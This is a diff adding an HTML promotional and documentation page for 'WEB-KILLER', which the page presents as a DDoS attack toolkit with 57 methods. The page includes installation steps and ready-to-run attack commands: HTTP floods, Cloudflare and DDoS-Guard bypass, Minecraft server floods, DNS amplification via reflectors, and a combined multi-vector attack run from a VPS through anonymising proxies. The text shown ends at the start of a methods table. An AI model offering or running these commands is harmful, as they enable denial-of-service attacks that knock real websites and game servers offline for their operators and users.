@@ -1,0 +1,1436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WEB-KILLER v2.1 - Ultimate DDoS Attack Toolkit</title>
+    <style>
+        :root {
+            --primary: #FF0000;
+            --secondary: #8B0000;
+            --dark: #0a0a0a;
+            --darker: #050505;
+            --light: #1a1a1a;
+            --text: #ffffff;
+            --text-dim: #888888;
+            --accent: #FFD700;
+            --gradient: linear-gradient(135deg, #FF0000, #8B0000);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--dark);
+            color: var(--text);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Animated Background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: 
+                radial-gradient(circle at 20% 50%, rgba(255,0,0,0.05) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(139,0,0,0.05) 0%, transparent 50%),
+                radial-gradient(circle at 50% 80%, rgba(255,0,0,0.03) 0%, transparent 50%);
+        }
+
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            background: var(--primary);
+            border-radius: 50%;
+            animation: float 15s infinite;
+            opacity: 0.3;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) translateX(0); }
+            25% { transform: translateY(-100px) translateX(50px); }
+            50% { transform: translateY(-200px) translateX(-50px); }
+            75% { transform: translateY(-100px) translateX(-100px); }
+        }
+
+        /* Navigation */
+        nav {
+            background: rgba(10,10,10,0.95);
+            backdrop-filter: blur(20px);
+            border-bottom: 2px solid var(--primary);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            padding: 0 20px;
+        }
+
+        .nav-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 0;
+        }
+
+        .logo {
+            font-size: 1.8em;
+            font-weight: 900;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(255,0,0,0.5);
+            letter-spacing: 2px;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+            position: relative;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--primary);
+            transition: width 0.3s;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        .btn-nav {
+            background: var(--gradient);
+            color: white !important;
+            padding: 10px 25px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: 700;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+
+        .btn-nav:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(255,0,0,0.4);
+        }
+
+        /* Hero Section */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 100px 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255,0,0,0.03) 2px, rgba(255,0,0,0.03) 4px);
+            pointer-events: none;
+        }
+
+        .hero-content {
+            max-width: 900px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero-badge {
+            display: inline-block;
+            background: rgba(255,0,0,0.1);
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            margin-bottom: 30px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(255,0,0,0.4); }
+            50% { box-shadow: 0 0 0 20px rgba(255,0,0,0); }
+        }
+
+        .hero h1 {
+            font-size: 4.5em;
+            font-weight: 900;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+
+        .hero-subtitle {
+            font-size: 1.4em;
+            color: var(--text-dim);
+            margin-bottom: 30px;
+        }
+
+        .hero-stats {
+            display: flex;
+            gap: 40px;
+            justify-content: center;
+            margin: 40px 0;
+            flex-wrap: wrap;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-number {
+            font-size: 3em;
+            font-weight: 900;
+            color: var(--primary);
+        }
+
+        .stat-label {
+            color: var(--text-dim);
+            font-size: 0.9em;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 15px 40px;
+            border-radius: 30px;
+            font-weight: 700;
+            text-decoration: none;
+            transition: all 0.3s;
+            margin: 10px;
+            cursor: pointer;
+            border: none;
+            font-size: 1em;
+        }
+
+        .btn-primary {
+            background: var(--gradient);
+            color: white;
+            box-shadow: 0 5px 20px rgba(255,0,0,0.4);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(255,0,0,0.6);
+        }
+
+        .btn-outline {
+            border: 2px solid var(--primary);
+            color: var(--primary);
+            background: transparent;
+        }
+
+        .btn-outline:hover {
+            background: var(--primary);
+            color: white;
+        }
+
+        /* Sections */
+        .section {
+            padding: 100px 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        .section-title {
+            font-size: 2.5em;
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 20px;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .section-subtitle {
+            text-align: center;
+            color: var(--text-dim);
+            font-size: 1.1em;
+            margin-bottom: 60px;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* Cards */
+        .card-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+        }
+
+        .card {
+            background: var(--light);
+            border: 1px solid #222;
+            border-radius: 15px;
+            padding: 30px;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: var(--gradient);
+            transform: scaleX(0);
+            transition: transform 0.3s;
+        }
+
+        .card:hover::before {
+            transform: scaleX(1);
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 20px 40px rgba(255,0,0,0.1);
+            border-color: var(--primary);
+        }
+
+        .card-icon {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+        }
+
+        .card h3 {
+            font-size: 1.3em;
+            margin-bottom: 15px;
+            color: var(--primary);
+        }
+
+        .card p {
+            color: var(--text-dim);
+        }
+
+        /* Tables */
+        .table-container {
+            overflow-x: auto;
+            margin: 30px 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--light);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        th {
+            background: var(--gradient);
+            color: white;
+            padding: 15px;
+            text-align: left;
+            font-weight: 700;
+        }
+
+        td {
+            padding: 12px 15px;
+            border-bottom: 1px solid #222;
+        }
+
+        tr:hover td {
+            background: rgba(255,0,0,0.05);
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        /* Code Blocks */
+        .code-block {
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            position: relative;
+            overflow-x: auto;
+        }
+
+        .code-block::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 30px;
+            background: #111;
+            border-radius: 10px 10px 0 0;
+        }
+
+        .code-dots {
+            position: absolute;
+            top: 10px;
+            left: 15px;
+            display: flex;
+            gap: 8px;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .dot-red { background: #FF5F56; }
+        .dot-yellow { background: #FFBD2E; }
+        .dot-green { background: #27C93F; }
+
+        .code-block code {
+            display: block;
+            margin-top: 20px;
+            color: #00FF00;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 0.9em;
+            line-height: 1.8;
+        }
+
+        .code-block .comment { color: #666; }
+        .code-block .keyword { color: #FF0000; }
+        .code-block .string { color: #FFD700; }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            gap: 5px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            padding: 10px 20px;
+            background: var(--light);
+            border: 1px solid #333;
+            color: var(--text);
+            cursor: pointer;
+            border-radius: 5px 5px 0 0;
+            transition: all 0.3s;
+        }
+
+        .tab-btn.active {
+            background: var(--primary);
+            border-color: var(--primary);
+            color: white;
+        }
+
+        .tab-content {
+            display: none;
+            background: var(--light);
+            padding: 30px;
+            border-radius: 0 10px 10px 10px;
+            border: 1px solid #333;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Warning Box */
+        .warning-box {
+            background: rgba(255,0,0,0.1);
+            border: 2px solid var(--primary);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 40px 0;
+            position: relative;
+        }
+
+        .warning-box::before {
+            content: '⚠️';
+            font-size: 2em;
+            position: absolute;
+            top: -20px;
+            left: 30px;
+            background: var(--dark);
+            padding: 0 10px;
+        }
+
+        .warning-box h3 {
+            color: var(--primary);
+            margin-bottom: 15px;
+        }
+
+        /* Accordion */
+        .accordion {
+            margin: 20px 0;
+        }
+
+        .accordion-header {
+            background: var(--light);
+            border: 1px solid #333;
+            padding: 15px 20px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+
+        .accordion-header:hover {
+            background: #222;
+        }
+
+        .accordion-header::after {
+            content: '+';
+            font-size: 1.5em;
+            color: var(--primary);
+        }
+
+        .accordion-header.active::after {
+            content: '−';
+        }
+
+        .accordion-content {
+            background: var(--darker);
+            border: 1px solid #333;
+            border-top: none;
+            padding: 0 20px;
+            max-height: 0;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+
+        .accordion-content.active {
+            padding: 20px;
+            max-height: 5000px;
+        }
+
+        /* Timeline */
+        .timeline {
+            position: relative;
+            padding-left: 30px;
+        }
+
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 2px;
+            height: 100%;
+            background: var(--primary);
+        }
+
+        .timeline-item {
+            position: relative;
+            margin-bottom: 30px;
+            padding-left: 30px;
+        }
+
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -34px;
+            top: 5px;
+            width: 12px;
+            height: 12px;
+            background: var(--primary);
+            border-radius: 50%;
+            border: 2px solid var(--dark);
+        }
+
+        /* Steps */
+        .step-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            counter-reset: step;
+        }
+
+        .step-card {
+            background: var(--light);
+            border: 1px solid #222;
+            border-radius: 15px;
+            padding: 30px;
+            position: relative;
+            counter-increment: step;
+        }
+
+        .step-card::before {
+            content: counter(step);
+            position: absolute;
+            top: -15px;
+            right: 20px;
+            width: 40px;
+            height: 40px;
+            background: var(--gradient);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 1.2em;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--darker);
+            border-top: 2px solid var(--primary);
+            padding: 60px 20px 30px;
+            text-align: center;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 30px;
+            max-width: 1200px;
+            margin: 0 auto 40px;
+            text-align: left;
+        }
+
+        .footer-col h4 {
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+
+        .footer-col a {
+            color: var(--text-dim);
+            text-decoration: none;
+            display: block;
+            margin-bottom: 10px;
+            transition: color 0.3s;
+        }
+
+        .footer-col a:hover {
+            color: var(--primary);
+        }
+
+        /* Mobile Menu */
+        .mobile-menu-btn {
+            display: none;
+            font-size: 1.5em;
+            background: none;
+            border: none;
+            color: white;
+            cursor: pointer;
+        }
+
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2.5em; }
+            .nav-links { display: none; }
+            .mobile-menu-btn { display: block; }
+            .nav-links.open {
+                display: flex;
+                flex-direction: column;
+                position: absolute;
+                top: 70px;
+                left: 0;
+                width: 100%;
+                background: var(--darker);
+                padding: 20px;
+                border-bottom: 2px solid var(--primary);
+            }
+            .hero-stats { gap: 20px; }
+            .stat-number { font-size: 2em; }
+        }
+
+        /* Smooth Scroll */
+        html { scroll-behavior: smooth; }
+
+        /* Glow effect */
+        .glow {
+            text-shadow: 0 0 10px rgba(255,0,0,0.5),
+                         0 0 20px rgba(255,0,0,0.3),
+                         0 0 30px rgba(255,0,0,0.1);
+        }
+    </style>
+</head>
+<body>
+
+<!-- Animated Background -->
+<div class="bg-animation"></div>
+<div class="particles" id="particles"></div>
+
+<!-- Navigation -->
+<nav>
+    <div class="nav-container">
+        <div class="logo glow">⚡ WEB-KILLER</div>
+        <button class="mobile-menu-btn" onclick="toggleMenu()">☰</button>
+        <ul class="nav-links" id="navLinks">
+            <li><a href="#home">🏠 Home</a></li>
+            <li><a href="#about">📖 About</a></li>
+            <li><a href="#features">✨ Features</a></li>
+            <li><a href="#installation">💻 Install</a></li>
+            <li><a href="#usage">🚀 Usage</a></li>
+            <li><a href="#methods">🎯 Methods</a></li>
+            <li><a href="#docs">📚 Docs</a></li>
+            <li><a href="https://github.com/Athexblackhat/WEB-KILLER" class="btn-nav">⭐ GitHub</a></li>
+        </ul>
+    </div>
+</nav>
+
+<!-- Hero Section -->
+<section class="hero" id="home">
+    <div class="hero-content">
+        <div class="hero-badge">🔥 v2.1 - Latest Release</div>
+        <h1>WEB-KILLER</h1>
+        <p class="hero-subtitle">Ultimate DDoS Attack Toolkit for Security Professionals</p>
+        <div class="hero-stats">
+            <div class="stat-item">
+                <div class="stat-number glow">57</div>
+                <div class="stat-label">Attack Methods</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number glow">112K+</div>
+                <div class="stat-label">Max PPS</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number glow">10+</div>
+                <div class="stat-label">Bypass Techniques</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-number glow">ALL</div>
+                <div class="stat-label">Platforms</div>
+            </div>
+        </div>
+        <a href="#installation" class="btn btn-primary">🚀 Get Started</a>
+        <a href="#docs" class="btn btn-outline">📚 Documentation</a>
+    </div>
+</section>
+
+<!-- About Section -->
+<section class="section" id="about">
+    <h2 class="section-title">📖 About WEB-KILLER</h2>
+    <p class="section-subtitle">A comprehensive network stress testing framework for authorized security assessments</p>
+    
+    <div class="card-grid">
+        <div class="card">
+            <div class="card-icon">🎯</div>
+            <h3>Purpose Built</h3>
+            <p>Designed for penetration testers, security researchers, and network administrators to test infrastructure resilience against DDoS attacks.</p>
+        </div>
+        <div class="card">
+            <div class="card-icon">🔧</div>
+            <h3>57 Attack Methods</h3>
+            <p>Comprehensive arsenal covering Layer 7 (HTTP/HTTPS), Layer 4 (TCP/UDP), and amplification attacks.</p>
+        </div>
+        <div class="card">
+            <div class="card-icon">🛡️</div>
+            <h3>Defense Bypass</h3>
+            <p>Advanced techniques to bypass Cloudflare, DDoS-Guard, AWS Shield, Akamai, and more.</p>
+        </div>
+        <div class="card">
+            <div class="card-icon">🌐</div>
+            <h3>Cross Platform</h3>
+            <p>Fully supported on Windows, Linux, macOS, and Android (Termux). Run anywhere.</p>
+        </div>
+        <div class="card">
+            <div class="card-icon">📊</div>
+            <h3>Real-time Analytics</h3>
+            <p>Live PPS, BPS, CPU, and RAM monitoring during attacks with 3D visualization.</p>
+        </div>
+        <div class="card">
+            <div class="card-icon">🔒</div>
+            <h3>Proxy System</h3>
+            <p>Automatic proxy downloading, validation, and rotation with HTTP, SOCKS4, SOCKS5 support.</p>
+        </div>
+    </div>
+</section>
+
+<!-- Features Section -->
+<section class="section" id="features" style="background: var(--darker);">
+    <h2 class="section-title">✨ Key Features</h2>
+    <p class="section-subtitle">Everything you need for professional network stress testing</p>
+    
+    <div class="card-grid">
+        <div class="card">
+            <div class="card-icon">🌐</div>
+            <h3>Layer 7 Attacks (26 Methods)</h3>
+            <p>HTTP/HTTPS flood attacks including GET, POST, Cloudflare bypass, DDoS-Guard bypass, bot simulation, and more.</p>
+        </div>
+        <div class="card">
+            <div class="card-icon">🔌</div>
+            <h3>Layer 4 Attacks (21 Methods)</h3>
+            <p>TCP/UDP/SYN/ICMP floods targeting servers, game services, and network infrastructure.</p>
+        </div>
+        <div class="card">
+            <div class="card-icon">📡</div>
+            <h3>Amplification (8 Methods)</h3>
+            <p>DNS (54x), NTP (556x), Memcached (51,000x), CLDAP (70x) amplification attacks.</p>
+        </div>
+        <div class="card">
+            <div class="card-icon">🎮</div>
+            <h3>Game Server Support</h3>
+            <p>Dedicated methods for Minecraft, FiveM, TeamSpeak 3, and Valve Source servers.</p>
+        </div>
+        <div class="card">
+            <div class="card-icon">🛠️</div>
+            <h3>Built-in Tools</h3>
+            <p>Ping scanner, GeoIP lookup, network monitor, site checker, DNS resolver, and more.</p>
+        </div>
+        <div class="card">
+            <div class="card-icon">🎨</div>
+            <h3>Interactive Launcher</h3>
+            <p>Beginner-friendly menu interface for easy attack configuration without memorizing commands.</p>
+        </div>
+    </div>
+</section>
+
+<!-- Installation Section -->
+<section class="section" id="installation">
+    <h2 class="section-title">💻 Installation Guide</h2>
+    <p class="section-subtitle">Get WEB-KILLER running in minutes on any platform</p>
+    
+    <div class="tabs">
+        <button class="tab-btn active" onclick="openTab(event, 'windows')">🪟 Windows</button>
+        <button class="tab-btn" onclick="openTab(event, 'linux')">🐧 Linux</button>
+        <button class="tab-btn" onclick="openTab(event, 'macos')">🍎 macOS</button>
+        <button class="tab-btn" onclick="openTab(event, 'termux')">📱 Termux</button>
+        <button class="tab-btn" onclick="openTab(event, 'vps')">☁️ VPS</button>
+    </div>
+
+    <div id="windows" class="tab-content active">
+        <h3>Windows Installation</h3>
+        <div class="step-grid">
+            <div class="step-card">
+                <h4>Install Python</h4>
+                <div class="code-block">
+                    <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                    <code>winget install Python.Python.3.11</code>
+                </div>
+                <p>Or download from <a href="https://python.org" style="color: #FF0000;">python.org</a></p>
+                <p><strong>✅ Check "Add Python to PATH"</strong></p>
+            </div>
+            <div class="step-card">
+                <h4>Install Git</h4>
+                <div class="code-block">
+                    <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                    <code>winget install Git.Git</code>
+                </div>
+            </div>
+            <div class="step-card">
+                <h4>Clone Repository</h4>
+                <div class="code-block">
+                    <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                    <code>cd Desktop<br>git clone https://github.com/Athexblackhat/WEB-KILLER.git<br>cd WEB-KILLER</code>
+                </div>
+            </div>
+            <div class="step-card">
+                <h4>Install & Run</h4>
+                <div class="code-block">
+                    <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                    <code>pip install -r requirements.txt<br>python launcher.py</code>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="linux" class="tab-content">
+        <h3>Linux Installation (Ubuntu/Debian)</h3>
+        <div class="code-block">
+            <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+            <code>
+<span class="comment"># Update system</span>
+sudo apt update && sudo apt upgrade -y
+
+<span class="comment"># Install dependencies</span>
+sudo apt install python3 python3-pip python3-dev git build-essential -y
+
+<span class="comment"># Clone and install</span>
+git clone https://github.com/Athexblackhat/WEB-KILLER.git
+cd WEB-KILLER
+pip3 install -r requirements.txt
+
+<span class="comment"># Run</span>
+python3 launcher.py
+            </code>
+        </div>
+    </div>
+
+    <div id="macos" class="tab-content">
+        <h3>macOS Installation</h3>
+        <div class="code-block">
+            <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+            <code>
+<span class="comment"># Install Homebrew</span>
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+
+<span class="comment"># Install Python & Git</span>
+brew install python@3.11 git
+
+<span class="comment"># Clone and install</span>
+cd ~/Desktop
+git clone https://github.com/Athexblackhat/WEB-KILLER.git
+cd WEB-KILLER
+pip3 install -r requirements.txt
+
+<span class="comment"># Run</span>
+python3 launcher.py
+            </code>
+        </div>
+    </div>
+
+    <div id="termux" class="tab-content">
+        <h3>Android (Termux) Installation</h3>
+        <div class="code-block">
+            <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+            <code>
+<span class="comment"># Update packages</span>
+pkg update && pkg upgrade -y
+
+<span class="comment"># Install requirements</span>
+pkg install python python-pip git -y
+
+<span class="comment"># Clone and install</span>
+git clone https://github.com/Athexblackhat/WEB-KILLER.git
+cd WEB-KILLER
+pip install -r requirements.txt
+
+<span class="comment"># Run (non-RAW methods only)</span>
+python run.py HELP
+            </code>
+        </div>
+    </div>
+
+    <div id="vps" class="tab-content">
+        <h3>Cloud VPS Installation</h3>
+        <div class="code-block">
+            <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+            <code>
+<span class="comment"># Connect via SSH</span>
+ssh root@your-vps-ip
+
+<span class="comment"># One-liner setup</span>
+apt update && apt install python3 python3-pip git screen -y
+git clone https://github.com/Athexblackhat/WEB-KILLER.git
+cd WEB-KILLER
+pip3 install -r requirements.txt
+
+<span class="comment"># Run in screen (keeps running after disconnect)</span>
+screen -S attack
+python3 run.py GET http://target.com 0 1000 proxies.txt 100 3600
+
+<span class="comment"># Detach: Ctrl+A then D | Reattach: screen -r attack</span>
+            </code>
+        </div>
+    </div>
+</section>
+
+<!-- Usage Section -->
+<section class="section" id="usage" style="background: var(--darker);">
+    <h2 class="section-title">🚀 Usage Guide</h2>
+    <p class="section-subtitle">Complete tutorial on how to use WEB-KILLER effectively</p>
+    
+    <h3>📋 Command Structure</h3>
+    <div class="table-container">
+        <table>
+            <tr>
+                <th>Attack Type</th>
+                <th>Command Format</th>
+            </tr>
+            <tr>
+                <td><strong>Layer 7</strong></td>
+                <td><code>python run.py &lt;method&gt; &lt;url&gt; &lt;proxy_type&gt; &lt;threads&gt; &lt;proxy_file&gt; &lt;rpc&gt; &lt;duration&gt; [debug]</code></td>
+            </tr>
+            <tr>
+                <td><strong>Layer 4</strong></td>
+                <td><code>python run.py &lt;method&gt; &lt;ip:port&gt; &lt;threads&gt; &lt;duration&gt; [proxy_type] [proxy_file]</code></td>
+            </tr>
+            <tr>
+                <td><strong>Amplification</strong></td>
+                <td><code>python run.py &lt;method&gt; &lt;ip:port&gt; &lt;threads&gt; &lt;duration&gt; &lt;reflector_file&gt; [debug]</code></td>
+            </tr>
+        </table>
+    </div>
+
+    <h3>🎯 Quick Start Examples</h3>
+    
+    <div class="accordion">
+        <div class="accordion-header" onclick="toggleAccordion(this)">Basic GET Flood Attack</div>
+        <div class="accordion-content">
+            <div class="code-block">
+                <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                <code>
+<span class="comment"># Attack a website with GET flood</span>
+<span class="comment"># 500 threads, 50 requests per connection, 60 seconds</span>
+python run.py GET http://example.com 0 500 proxies.txt 50 60
+                </code>
+            </div>
+            <p><strong>Breakdown:</strong></p>
+            <ul>
+                <li><code>GET</code> - HTTP GET method</li>
+                <li><code>http://example.com</code> - Target URL</li>
+                <li><code>0</code> - Use all proxy types</li>
+                <li><code>500</code> - Number of concurrent threads</li>
+                <li><code>proxies.txt</code> - Proxy list file</li>
+                <li><code>50</code> - Requests per connection (RPC)</li>
+                <li><code>60</code> - Duration in seconds</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="accordion">
+        <div class="accordion-header" onclick="toggleAccordion(this)">Cloudflare Bypass Attack</div>
+        <div class="accordion-content">
+            <div class="code-block">
+                <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                <code>
+<span class="comment"># Bypass Cloudflare protection</span>
+<span class="comment"># Use SOCKS5 proxies, 800 threads, 10 minutes</span>
+python run.py CFB https://protected-site.com 5 800 socks5.txt 80 600 debug
+                </code>
+            </div>
+            <p><strong>Tips:</strong></p>
+            <ul>
+                <li>Use <code>CFB</code> for standard Cloudflare</li>
+                <li>Use <code>CFBUAM</code> for Under Attack Mode</li>
+                <li>SOCKS5 proxies provide better anonymity</li>
+                <li>Add <code>debug</code> flag to see real-time stats</li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="accordion">
+        <div class="accordion-header" onclick="toggleAccordion(this)">Minecraft Server Attack</div>
+        <div class="accordion-content">
+            <div class="code-block">
+                <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                <code>
+<span class="comment"># Minecraft Java Edition server</span>
+python run.py MINECRAFT mc.server.com:25565 20 300
+
+<span class="comment"># Minecraft bot flood with login</span>
+python run.py MCBOT play.server.com:25565 50 600 5 socks5.txt
+                </code>
+            </div>
+        </div>
+    </div>
+
+    <div class="accordion">
+        <div class="accordion-header" onclick="toggleAccordion(this)">DNS Amplification Attack</div>
+        <div class="accordion-content">
+            <div class="code-block">
+                <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                <code>
+<span class="comment"># DNS amplification (54x traffic amplification)</span>
+<span class="comment"># Requires reflector servers list</span>
+python run.py DNS target.com:53 10 300 dns_reflectors.txt debug
+                </code>
+            </div>
+            <div class="warning-box">
+                <h3>⚠️ Important</h3>
+                <p>Amplification attacks require a list of vulnerable reflector servers. These methods need RAW socket access (root/admin).</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="accordion">
+        <div class="accordion-header" onclick="toggleAccordion(this)">Multi-Vector Maximum Attack</div>
+        <div class="accordion-content">
+            <div class="code-block">
+                <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+                <code>
+<span class="comment"># Terminal 1: Layer 7 HTTP/2 attack</span>
+python run.py STOMP https://target.com 5 1000 socks5.txt 100 3600 &
+
+<span class="comment"># Terminal 2: Layer 4 SYN flood (requires sudo)</span>
+sudo python run.py SYN target.com:443 100 3600 &
+
+<span class="comment"># Terminal 3: DNS amplification</span>
+sudo python run.py DNS target.com:53 10 3600 dns_servers.txt &
+
+<span class="comment"># Terminal 4: Monitor with DSTAT</span>
+python run.py TOOLS
+                </code>
+            </div>
+        </div>
+    </div>
+
+    <h3>🎮 Interactive Launcher</h3>
+    <div class="code-block">
+        <div class="code-dots"><span class="dot dot-red"></span><span class="dot dot-yellow"></span><span class="dot dot-green"></span></div>
+        <code>
+<span class="comment"># Launch the beginner-friendly menu</span>
+python launcher.py
+
+<span class="comment"># Menu Options:</span>
+<span class="comment"># [1] Layer7 Attack - Step-by-step HTTP configuration</span>
+<span class="comment"># [2] Layer4 Attack - TCP/UDP attack setup</span>
+<span class="comment"># [3] Amplification - AMP attack setup</span>
+<span class="comment"># [4] Tools Console - Network utilities</span>
+<span class="comment"># [5] View Help - Usage reference</span>
+<span class="comment"># [6] Stop All Attacks - Emergency stop</span>
+        </code>
+    </div>
+
+    <h3>🔢 Proxy Types Reference</h3>
+    <div class="table-container">
+        <table>
+            <tr><th>Code</th><th>Type</th><th>Best For</th></tr>
+            <tr><td><strong>0</strong></td><td>ALL</td><td>Maximum variety</td></tr>
+            <tr><td><strong>1</strong></td><td>HTTP</td><td>Layer 7 attacks</td></tr>
+            <tr><td><strong>4</strong></td><td>SOCKS4</td><td>TCP connections</td></tr>
+            <tr><td><strong>5</strong></td><td>SOCKS5</td><td>Best anonymity</td></tr>
+            <tr><td><strong>6</strong></td><td>RANDOM</td><td>Auto-selection</td></tr>
+        </table>
+    </div>
+</section>
+
+<!-- Methods Section -->
+<section class="section" id="methods">
+    <h2 class="section-title">🎯 Attack Methods</h2>
+    <p class="section-subtitle">Complete reference of all 57 attack methods</p>
+    
+    <div class="tabs">
+        <button class="tab-btn active" onclick="openTab(event, 'l7')">🌐 Layer 7 (26)</button>
+        <button class="tab-btn" onclick="openTab(event, 'l4')">🔌 Layer 4 (21)</button>
+        <button class="tab-btn" onclick="openTab(event, 'amp')">📡 Amplification (8)</button>
+        <button class="tab-btn" onclick="openTab(event, 'tools')">🛠️ Tools (7)</button>
+    </div>
+
+    <div id="l7" class="tab-content active">
+        <div class="table-container">
+            <table>
+                <tr><th>#</th><th>Method</th><th>Description</th><th>Bypass</th><th>Power</th></tr>
+                <tr><td>1</td><td><strong>GET</strong></td><td>Standard HTTP GET flood</td><td>⭐⭐</td><td>⭐⭐⭐</td></tr>
